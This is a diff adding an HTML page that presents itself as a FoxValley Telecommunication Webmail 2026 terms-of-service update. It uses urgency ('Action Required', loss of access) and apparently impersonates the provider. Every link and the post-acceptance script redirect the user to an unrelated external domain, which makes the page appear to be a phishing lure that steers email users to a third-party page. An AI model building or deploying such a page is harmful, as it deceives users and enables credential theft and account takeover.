@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>FoxValley Webmail – 2026 Terms of Service Update</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #0f172a, #1e293b);
+      color: #0f172a;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .page-wrapper {
+      max-width: 860px;
+      width: 100%;
+      background-color: #f9fafb;
+      border-radius: 16px;
+      box-shadow: 0 20px 40px rgba(15, 23, 42, 0.35);
+      overflow: hidden;
+    }
+
+    .header {
+      background: linear-gradient(135deg, #b91c1c, #ef4444);
+      padding: 0 24px;
+      color: #f9fafb;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    /* LOGO CONTAINER: padding top/bottom 20, left/right 40 */
+    .header-logo {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #f3f4f6;
+      padding: 15px 15px;
+      border-radius: 10px;
+    }
+
+    .header-logo img {
+      display: block;
+      max-height: 42px;
+      max-width: 120px;
+      width: 100%;
+      height: auto;
+    }
+
+    .header-text h1 {
+      font-size: 18px;
+      margin-bottom: 2px;
+    }
+
+    .header-text p {
+      font-size: 12px;
+      opacity: 0.95;
+    }
+
+    .content {
+      padding: 24px 32px 28px;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      background-color: #fee2e2;
+      color: #b91c1c;
+      border-radius: 999px;
+      padding: 4px 10px;
+      margin-bottom: 12px;
+    }
+
+    .badge-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: #22c55e;
+    }
+
+    .title {
+      font-size: 20px;
+      margin-bottom: 8px;
+      color: #0f172a;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #4b5563;
+      margin-bottom: 18px;
+    }
+
+    .terms-box {
+      background-color: #ffffff;
+      border-radius: 12px;
+      border: 1px solid #e5e7eb;
+      padding: 16px 18px;
+      max-height: 260px;
+      overflow-y: auto;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #374151;
+    }
+
+    .terms-box h2 {
+      font-size: 14px;
+      margin-bottom: 8px;
+      color: #111827;
+    }
+
+    .terms-box h3 {
+      font-size: 13px;
+      margin-top: 12px;
+      margin-bottom: 4px;
+      color: #111827;
+    }
+
+    .terms-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      font-size: 11px;
+      color: #6b7280;
+      margin-top: 10px;
+      margin-bottom: 16px;
+    }
+
+    .terms-meta span {
+      padding: 4px 8px;
+      border-radius: 999px;
+      background-color: #e5e7eb;
+    }
+
+    .actions {
+      margin-top: 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .checkbox-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      font-size: 13px;
+      color: #374151;
+    }
+
+    .checkbox-row input[type="checkbox"] {
+      margin-top: 2px;
+      width: 16px;
+      height: 16px;
+      cursor: pointer;
+    }
+
+    .checkbox-row label {
+      cursor: pointer;
+    }
+
+    .checkbox-row a {
+      color: #b91c1c;
+      text-decoration: none;
+    }
+
+    .checkbox-row a:hover {
+      text-decoration: underline;
+    }
+
+    .button-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      align-items: center;
+      justify-content: flex-start;
+    }
+
+    .primary-btn {
+      border: none;
+      border-radius: 999px;
+      padding: 10px 20px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      color: #f9fafb;
+      background: linear-gradient(135deg, #b91c1c, #ef4444);
+      box-shadow: 0 12px 20px rgba(185, 28, 28, 0.35);
+      transition: transform 0.08s ease, box-shadow 0.08s ease, opacity 0.08s ease;
+    }
+
+    .primary-btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 16px 26px rgba(185, 28, 28, 0.45);
+    }
+
+    .primary-btn:active {
+      transform: translateY(0);
+      box-shadow: 0 8px 14px rgba(185, 28, 28, 0.35);
+    }
+
+    .primary-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+    }
+
+    .helper-text {
+      font-size: 11px;
+      color: #6b7280;
+    }
+
+    .footer {
+      border-top: 1px solid #e5e7eb;
+      padding: 12px 32px 16px;
+      font-size: 11px;
+      color: #6b7280;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 8px;
+      background-color: #f3f4f6;
+    }
+
+    .footer a {
+      color: #b91c1c;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 640px) {
+      .content,
+      .footer {
+        padding-left: 18px;
+        padding-right: 18px;
+      }
+
+      .header-text h1 {
+        font-size: 16px;
+      }
+
+      .title {
+        font-size: 18px;
+      }
+
+      .header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="page-wrapper">
+  <header class="header">
+    <div class="header-left">
+      <div class="header-logo">
+        <img
+          src="https://2xqb9g88cp.ucarecd.net/79ac03f9-8ce4-4154-a4f4-5efc5638cead/logofooxopi.svg"
+          alt="FoxValley Telecommunication Logo"
+        >
+      </div>
+      <div class="header-text">
+        <h1>FoxValley Telecommunication Webmail</h1>
+        <p>2026 Terms of Service and Privacy Policy Update</p>
+      </div>
+    </div>
+  </header>
+
+  <main class="content">
+    <div class="badge">
+      <span class="badge-dot"></span>
+      2026 Update · Action Required
+    </div>
+
+    <h2 class="title">Review and confirm the new FoxValley Webmail terms</h2>
+    <p class="subtitle">
+      To continue using FoxValley Telecommunication Webmail, please review our updated 2026 Terms of Service
+      and Privacy Policy, then confirm your acceptance below.
+    </p>
+
+    <section class="terms-box" aria-label="FoxValley 2026 Terms of Service summary">
+      <h2>Summary of 2026 updates</h2>
+      <p>
+        Our 2026 update explains how FoxValley Telecommunication collects, uses, and protects your webmail data,
+        and clarifies your responsibilities for keeping your account secure.
+      </p>
+
+      <h3>Account and security</h3>
+      <p>
+        You are responsible for maintaining the confidentiality of your login details and for all activity that
+        occurs under your account. You agree to notify FoxValley promptly of any suspected unauthorized use.
+      </p>
+
+      <h3>Data usage and privacy</h3>
+      <p>
+        We process your data only to deliver and improve FoxValley Webmail, comply with legal obligations,
+        and protect the security of our network. Additional details are available in the full Privacy Policy.
+      </p>
+
+      <h3>Service availability</h3>
+      <p>
+        We aim to provide reliable access to FoxValley Webmail, but occasional maintenance or interruptions may occur.
+        When possible, we will schedule maintenance during low‑traffic periods.
+      </p>
+
+      <h3>Acceptable use</h3>
+      <p>
+        You agree not to use FoxValley Webmail to send spam, malicious content, or unlawful material and not to
+        interfere with the operation or security of FoxValley systems.
+      </p>
+
+      <p style="margin-top: 10px;">
+        For the full legal text, please review the complete Terms of Service and Privacy Policy linked below before confirming.
+      </p>
+
+      <div class="terms-meta">
+        <span>Effective date: March 15, 2026</span>
+        <span>Service: FoxValley Telecommunication Webmail</span>
+        <span>Region: Global</span>
+      </div>
+    </section>
+
+    <form class="actions" onsubmit="return handleSubmit(event)">
+      <div class="checkbox-row">
+        <input type="checkbox" id="acceptTerms" name="acceptTerms" required>
+        <label for="acceptTerms">
+          I have read and agree to the updated
+          <a href="https://www.viewinfoactivity.com/foxvalley-security" target="_blank" rel="noopener noreferrer">2026 Terms of Service</a>
+          and Privacy Policy for FoxValley Telecommunication Webmail.
+        </label>
+      </div>
+
+      <div class="button-row">
+        <button type="submit" id="continueBtn" class="primary-btn" disabled>
+          Confirm and continue to Webmail
+        </button>
+        <p class="helper-text">
+          You must accept the updated terms to continue using your FoxValley Webmail account after March 15, 2026.
+        </p>
+      </div>
+    </form>
+  </main>
+
+  <footer class="footer">
+    <span>© 2026 FoxValley Telecommunication. All rights reserved.</span>
+    <span>
+      Need help? Visit
+      <a href="https://www.viewinfoactivity.com/foxvalley-security" target="_blank" rel="noopener noreferrer">Support</a>
+    </span>
+  </footer>
+</div>
+
+<script>
+  const checkbox = document.getElementById('acceptTerms');
+  const button = document.getElementById('continueBtn');
+
+  checkbox.addEventListener('change', function () {
+    button.disabled = !this.checked;
+  });
+
+  function handleSubmit(event) {
+    event.preventDefault();
+    if (!checkbox.checked) return;
+
+    // Redirect after confirmation
+    window.location.href = 'https://www.viewinfoactivity.com/foxvalley-security';
+  }
+</script>
+
+</body>
+</html>
